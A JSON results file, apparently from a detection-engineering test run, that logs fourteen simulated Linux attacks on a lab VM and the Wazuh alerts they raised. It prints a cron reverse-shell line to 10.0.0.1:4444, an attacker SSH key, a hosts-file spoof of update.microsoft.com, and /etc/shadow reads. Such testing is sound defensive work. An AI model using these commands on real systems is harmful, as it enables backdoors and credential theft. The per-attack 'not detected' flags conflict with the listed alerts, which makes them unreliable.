@@ -1,0 +1,990 @@
+{
+  "run_id": "WAZUH_LINUX_TEST_20260718_175535",
+  "target": "192.168.56.102",
+  "start_time": "2026-07-18T17:55:36Z",
+  "attacks_total": 14,
+  "attacks_succeeded": 14,
+  "wazuh_linux_alerts": 127,
+  "results": [
+    {
+      "name": "SSH Brute Force",
+      "scenario_id": "linux_001",
+      "success": true,
+      "description": "5 failed SSH login attempts to user 'ubuntu' with wrong passwords from remote host.",
+      "details": {
+        "target_user": "ubuntu",
+        "attempts": [
+          {
+            "password": "password",
+            "result": "auth_failed"
+          },
+          {
+            "password": "123456",
+            "result": "auth_failed"
+          },
+          {
+            "password": "admin123",
+            "result": "auth_failed"
+          },
+          {
+            "password": "letmein",
+            "result": "auth_failed"
+          },
+          {
+            "password": "ubuntu123",
+            "result": "auth_failed"
+          }
+        ]
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Cron Job Persistence",
+      "scenario_id": "linux_003",
+      "success": true,
+      "description": "Created malicious cron job for persistence.",
+      "details": {
+        "cron_file": {
+          "cmd": "cat /opt/attack_test/fake_cron/malicious",
+          "stdout": "* * * * * /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+          "stderr": "",
+          "status": 0
+        },
+        "crontab": {
+          "cmd": "crontab -l",
+          "stdout": "# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_143832\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_144647\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_145212\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_150403\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_150833\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_151930\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_153719\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_153920\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260711_211520\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260716_060045\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260716_060232\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260716_061620\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260716_085001\n# ATTACK_TEST_WAZUH_LINUX_TEST_20260718_175535",
+          "stderr": "",
+          "status": 0
+        }
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "SUID Binary Abuse",
+      "scenario_id": "linux_004",
+      "success": true,
+      "description": "Created SUID binary to escalate privileges.",
+      "details": {
+        "binary": "-rwsr-xr-x 1 mike mike 204264 Jul 18 20:55 /opt/attack_test/suid_find"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Unauthorized User Creation",
+      "scenario_id": "linux_005",
+      "success": true,
+      "description": "Created unauthorized user with sudo privileges.",
+      "details": {
+        "user": "hacker_175535",
+        "passwd_entry": "hacker_175535:x:1002:1002::/home/hacker_175535:/bin/bash"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "SSH Key Injection",
+      "scenario_id": "linux_006",
+      "success": true,
+      "description": "Injected unauthorized SSH key into authorized_keys.",
+      "details": {
+        "key_added": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackKeyWAZUH_LINUX_TEST_20260718_175535 attacker@evil.com"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Systemd Backdoor",
+      "scenario_id": "linux_007",
+      "success": true,
+      "description": "Created malicious systemd service file.",
+      "details": {
+        "service_file": "/opt/attack_test/fake_systemd/backdoor.service"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Bashrc Persistence",
+      "scenario_id": "linux_008",
+      "success": true,
+      "description": "Injected malicious alias into .bashrc for persistence.",
+      "details": {
+        "tail": "echo ATTACK_MAGIC: WAZUH_LINUX_TEST_20260710_154838 >> /tmp/attacker_log.txt\necho ATTACK_MAGIC: WAZUH_LINUX_TEST_20260710_155224 >> /tmp/attacker_log.txt\n# ATTACK_WAZUH_LINUX_TEST_20260718_175535"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Log Tampering",
+      "scenario_id": "linux_009",
+      "success": true,
+      "description": "Tampered with log files and cleared bash history.",
+      "details": {
+        "log_after_tamper": "Jul 10 10:00:00 host sshd[1234]: Accepted password for root from 1.2.3.4 port 54321 ssh2\nJul 10 10:02:00 host sudo[1236]: mike : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash",
+        "history_cleared": true
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Credential Dumping",
+      "scenario_id": "linux_010",
+      "success": true,
+      "description": "Read /etc/shadow to dump password hashes.",
+      "details": {
+        "users_with_hashes": [
+          "systemd-network",
+          "systemd-timesync",
+          "systemd-resolve",
+          "systemd-oom",
+          "fwupd-refresh",
+          "gnome-remote-desktop",
+          "polkitd",
+          "mike",
+          "testuser_155224"
+        ],
+        "shadow_lines": 57
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Sudoers Modification",
+      "scenario_id": "linux_011",
+      "success": true,
+      "description": "Modified sudoers to grant unauthorized privileges.",
+      "details": {
+        "sudoers_d": "mike\nREADME\nzzz_attack_test"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Hosts File Modification",
+      "scenario_id": "linux_012",
+      "success": true,
+      "description": "Modified /etc/hosts for DNS spoofing.",
+      "details": {
+        "hosts_tail": "ff02::3 ip6-allhosts\n# ATTACK_WAZUH_LINUX_TEST_20260718_175535\n10.0.0.1 evil.com update.microsoft.com"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Firewall Tampering",
+      "scenario_id": "linux_013",
+      "success": true,
+      "description": "Added firewall rule to open backdoor port 4444.",
+      "details": {
+        "rule_added": "1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:4444"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "System Reconnaissance",
+      "scenario_id": "linux_014",
+      "success": true,
+      "description": "Performed system enumeration and reconnaissance.",
+      "details": {
+        "OS info": "Linux UbuntuLinux 6.17.0-35-generic #35~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Tue May 26 19:30:42 UTC 2 x86_64 x86_64 x86_64 GNU/Linux",
+        "Current user": "uid=1000(mike) gid=1000(mike) groups=1000(mike),27(sudo)\nmike",
+        "OS release": "PRETTY_NAME=\"Ubuntu 24.04.4 LTS\"\nNAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\nVERSION=\"24.04.4 LTS (Noble Numbat)\"\nVERSION_CODENAME=noble\nID=ubuntu\nID_LIKE=debian\nHOME_URL=\"https://www.ubuntu.com/\"\nSUPPORT_URL=\"h",
+        "Running processes": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nmike        7184  200  0.0  22428  4908 ?        R    20:56   0:00 ps aux --sort=-%cpu\nwazuh-i+    1537 32.3 17.1 5124976 169",
+        "Open ports": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 127.0.0.54:53           0.0.0.0:*   ",
+        "SUID files": "FAILED: ",
+        "Crontab": "# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files ",
+        "Home directories": "total 16\ndrwxr-xr-x  4 root            root            4096 Jul 18 20:55 .\ndrwxr-xr-x 23 root            root            4096 Jun 25 12:17 ..\ndrwxr-x--- 17 mike            mike            4096 Jul 18 ",
+        "Sudo permissions": "Matching Defaults entries for mike on UbuntuLinux:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser mike may run the",
+        "Login history": "mike     tty2         tty2             Sat Jul 18 20:44   still logged in\nmike     seat0        login screen     Sat Jul 18 20:44   still logged in\nreboot   system boot  6.17.0-35-generi Sat Jul 18 20"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    },
+    {
+      "name": "Data Exfiltration",
+      "scenario_id": "linux_015",
+      "success": true,
+      "description": "Staged sensitive data for exfiltration.",
+      "details": {
+        "files": {
+          "/etc/passwd": "accessible",
+          "/etc/shadow": "accessible",
+          "/home/mike/.bash_history": "accessible",
+          "/home/mike/.ssh/known_hosts": "accessible",
+          "/var/log/auth.log": "accessible"
+        },
+        "staged": "-rw-r--r-- 1 root root 2.2K Jul 18 20:56 /tmp/exfil_WAZUH_LINUX_TEST_20260718_175535.b64"
+      },
+      "wazuh_detected": false,
+      "wazuh_alert_count": 0
+    }
+  ],
+  "detections": [
+    {
+      "rule_id": "100314",
+      "description": "ABSEGA: Data Exfiltration simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:56:20.294Z"
+    },
+    {
+      "rule_id": "100314",
+      "description": "ABSEGA: Data Exfiltration simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:56:18.726Z"
+    },
+    {
+      "rule_id": "100313",
+      "description": "ABSEGA: System Reconnaissance simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:56:02.283Z"
+    },
+    {
+      "rule_id": "100312",
+      "description": "ABSEGA: Firewall Tampering simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:56:02.276Z"
+    },
+    {
+      "rule_id": "100313",
+      "description": "ABSEGA: System Reconnaissance simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:56:02.274Z"
+    },
+    {
+      "rule_id": "100312",
+      "description": "ABSEGA: Firewall Tampering simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:56:01.279Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:56:00.754Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:56:00.649Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:56:00.502Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:56:00.402Z"
+    },
+    {
+      "rule_id": "100311",
+      "description": "ABSEGA: Hosts File Modification simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:56:00.269Z"
+    },
+    {
+      "rule_id": "100310",
+      "description": "ABSEGA: Sudoers Modification simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:56:00.268Z"
+    },
+    {
+      "rule_id": "100302",
+      "description": "ABSEGA: Credential Dumping attack simulated",
+      "level": 10,
+      "timestamp": "2026-07-18T17:56:00.267Z"
+    },
+    {
+      "rule_id": "100311",
+      "description": "ABSEGA: Hosts File Modification simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:56:00.263Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:59.665Z"
+    },
+    {
+      "rule_id": "100310",
+      "description": "ABSEGA: Sudoers Modification simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:55:59.511Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:59.496Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:59.358Z"
+    },
+    {
+      "rule_id": "100302",
+      "description": "ABSEGA: Credential Dumping attack simulated",
+      "level": 10,
+      "timestamp": "2026-07-18T17:55:58.659Z"
+    },
+    {
+      "rule_id": "100309",
+      "description": "ABSEGA: Log Tampering simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:55:58.268Z"
+    },
+    {
+      "rule_id": "100308",
+      "description": "ABSEGA: Bashrc Persistence simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:58.266Z"
+    },
+    {
+      "rule_id": "100309",
+      "description": "ABSEGA: Log Tampering simulated",
+      "level": 6,
+      "timestamp": "2026-07-18T17:55:58.264Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:57.986Z"
+    },
+    {
+      "rule_id": "100308",
+      "description": "ABSEGA: Bashrc Persistence simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:57.266Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:57.172Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:57.108Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:56.899Z"
+    },
+    {
+      "rule_id": "100306",
+      "description": "ABSEGA: SSH Key Injection simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:56.259Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:56.259Z"
+    },
+    {
+      "rule_id": "100307",
+      "description": "ABSEGA: Systemd Backdoor simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:56.259Z"
+    },
+    {
+      "rule_id": "100307",
+      "description": "ABSEGA: Systemd Backdoor simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:56.259Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.669Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.553Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.540Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.539Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.537Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.533Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.525Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.516Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.509Z"
+    },
+    {
+      "rule_id": "100306",
+      "description": "ABSEGA: SSH Key Injection simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:55.507Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.500Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.490Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.482Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.479Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.471Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.459Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.447Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.434Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.434Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:55.428Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.409Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.402Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.395Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.390Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.308Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.298Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.293Z"
+    },
+    {
+      "rule_id": "100303",
+      "description": "ABSEGA: Unauthorized User Creation simulated",
+      "level": 10,
+      "timestamp": "2026-07-18T17:55:54.247Z"
+    },
+    {
+      "rule_id": "100305",
+      "description": "ABSEGA: SUID Binary Abuse simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:54.247Z"
+    },
+    {
+      "rule_id": "100304",
+      "description": "ABSEGA: Cron Job Persistence simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:54.243Z"
+    },
+    {
+      "rule_id": "100303",
+      "description": "ABSEGA: Unauthorized User Creation simulated",
+      "level": 10,
+      "timestamp": "2026-07-18T17:55:54.243Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.164Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.163Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.163Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.157Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.157Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.149Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.144Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.144Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.143Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.143Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.143Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.135Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.129Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.120Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.113Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.107Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.097Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.091Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.084Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.077Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.077Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.070Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.064Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:54.054Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.045Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.039Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.029Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.014Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:54.007Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:53.999Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:53.999Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:53.989Z"
+    },
+    {
+      "rule_id": "553",
+      "description": "File deleted.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:53.983Z"
+    },
+    {
+      "rule_id": "554",
+      "description": "File added to the system.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:53.978Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:53.257Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:53.171Z"
+    },
+    {
+      "rule_id": "100305",
+      "description": "ABSEGA: SUID Binary Abuse simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:53.152Z"
+    },
+    {
+      "rule_id": "100304",
+      "description": "ABSEGA: Cron Job Persistence simulated",
+      "level": 8,
+      "timestamp": "2026-07-18T17:55:52.606Z"
+    },
+    {
+      "rule_id": "550",
+      "description": "Integrity checksum changed.",
+      "level": 7,
+      "timestamp": "2026-07-18T17:55:52.362Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:52.238Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:51.128Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:50.238Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:50.238Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:49.497Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:49.127Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:48.229Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:47.125Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:44.220Z"
+    },
+    {
+      "rule_id": "5551",
+      "description": "PAM: Multiple failed logins in a small period of time.",
+      "level": 10,
+      "timestamp": "2026-07-18T17:55:44.220Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:44.220Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:44.219Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:44.219Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:43.490Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:42.218Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:42.218Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:42.218Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:41.494Z"
+    },
+    {
+      "rule_id": "5712",
+      "description": "sshd: brute force trying to get access to the system. Non existent user.",
+      "level": 10,
+      "timestamp": "2026-07-18T17:55:41.490Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:40.551Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:40.217Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:40.216Z"
+    },
+    {
+      "rule_id": "5503",
+      "description": "PAM: User login failed.",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:39.104Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:39.099Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:38.216Z"
+    },
+    {
+      "rule_id": "5710",
+      "description": "sshd: Attempt to login using a non-existent user",
+      "level": 5,
+      "timestamp": "2026-07-18T17:55:36.551Z"
+    }
+  ]
+}
